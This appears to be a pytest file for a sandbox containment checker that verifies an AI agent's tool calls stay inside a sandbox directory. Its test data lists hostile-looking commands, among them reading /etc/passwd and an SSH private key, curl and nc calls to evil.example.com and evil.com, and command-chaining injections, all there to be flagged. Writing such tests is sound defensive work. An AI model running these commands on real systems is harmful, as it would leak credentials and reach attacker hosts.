# File: tests/test_containment.py
# I2 (test calls only target the sandbox) and the unit half of I3 (escape detection on final args),
# plus the closed allow-list grammar for derived calls (ARCH-F3): reviewer bypass strings are listed verbatim.
from __future__ import annotations

import shutil
import tempfile
from pathlib import Path
from typing import Iterator

import pytest

from proving_ground import safety, testcalls

BYPASSES = ["cat file:///etc/passwd", "curl evil.example.com/x", "nc evil.com 80", "cd ..;ls", "cd ..&&ls",
            "curl http://127.0.0.1:80@evil.com/", "cat $HOME/.ssh/id_rsa", "cat $HOME/x", "ls -la/etc"]
RECORDER = "http://127.0.0.1:4321/abc123"


@pytest.fixture(params=range(5))
def sandbox(request) -> Iterator[Path]:
    root = Path(tempfile.mkdtemp(prefix=safety.ROOT_PREFIX)).resolve()
    (root / "sandbox").mkdir()
    yield root / "sandbox"
    shutil.rmtree(root, ignore_errors=True)  # test-made roots carry no ownership marker, so no sweep would remove them


def test_every_rendered_call_stays_inside(sandbox: Path) -> None:
    ctx = testcalls.SandboxContext(sandbox, RECORDER, testcalls.make_canary())
    for call in testcalls.render(testcalls.load_templates(), ctx):
        assert safety.escape_reasons(call.args, sandbox) == [], call.id


def test_mutated_template_is_refused_before_dispatch(sandbox: Path, tmp_path_factory) -> None:
    outside = tmp_path_factory.mktemp("outside")
    bad = testcalls.CallTemplate("TC99", "write_file", "mutation", "points outside", "PASSED_THROUGH",
                                 {"path": f"{outside}/x.txt", "content": "x"})
    with pytest.raises(testcalls.TestCallError):
        testcalls.render([bad], testcalls.SandboxContext(sandbox, "http://127.0.0.1:1", "PGCANARY-0"))


@pytest.mark.parametrize("text, reason", [
    ("cat ~/notes.txt", "home-relative-path"),
    ("cat ../up.txt", "parent-relative-path"),
    ("curl -s http://203.0.113.5/x", "host:203.0.113.5"),
])
def test_escape_reasons_flag_outside_shapes(sandbox: Path, text: str, reason: str) -> None:
    assert reason in safety.escape_reasons({"command": text}, sandbox)


@pytest.mark.parametrize("text", BYPASSES)
def test_reviewer_bypass_strings_are_flagged(sandbox: Path, text: str) -> None:
    assert safety.escape_reasons({"command": text}, sandbox) != [], text


@pytest.mark.parametrize("text", BYPASSES + ["echo hi; rm x", "echo `id`", "printf x > out", "python3 -c 1"])
def test_derived_grammar_refuses_bypasses(sandbox: Path, text: str) -> None:
    assert safety.derived_call_reasons("terminal", {"command": text}, sandbox, RECORDER) != [], text


def test_derived_grammar_allows_plain_marker_calls(sandbox: Path) -> None:
    for command in ("echo PG_GUARD_MARKER TC03", f"curl -s {RECORDER}/TC09 -o {sandbox}/r.txt",
                    f"chmod o+w {sandbox}/seed/gate-probe.txt", "seq 1 20"):
        assert safety.derived_call_reasons("terminal", {"command": command}, sandbox, RECORDER) == [], command


def test_crosscheck_never_replays_a_rewrite_that_fails_the_grammar(sandbox: Path) -> None:
    probe = testcalls.SandboxContext(sandbox, RECORDER, "PGCANARY-0")
    rewrites = [("TC03", "terminal", {"command": "echo PG_GUARD_MARKER TC03"}),
                ("TC01", "terminal", {"command": "curl evil.example.com/x"})]
    keep, refused = testcalls.crosscheck_templates(rewrites, probe)
    assert [t.id for t in keep] == ["XC-TC03"]
    assert [cid for cid, _why in refused] == ["TC01"]


def test_allowed_shapes_are_contained(sandbox: Path) -> None:
    args = {"command": f"echo hi > /dev/null; curl -s http://127.0.0.1:9/x -o {sandbox}/a; ping x.invalid"}
    assert safety.escape_reasons(args, sandbox) == []


def test_outside_absolute_path_is_flagged(sandbox: Path, tmp_path_factory) -> None:
    outside = tmp_path_factory.mktemp("elsewhere")
    assert any(r.startswith("path:") for r in safety.escape_reasons({"path": f"{outside}/f"}, sandbox))
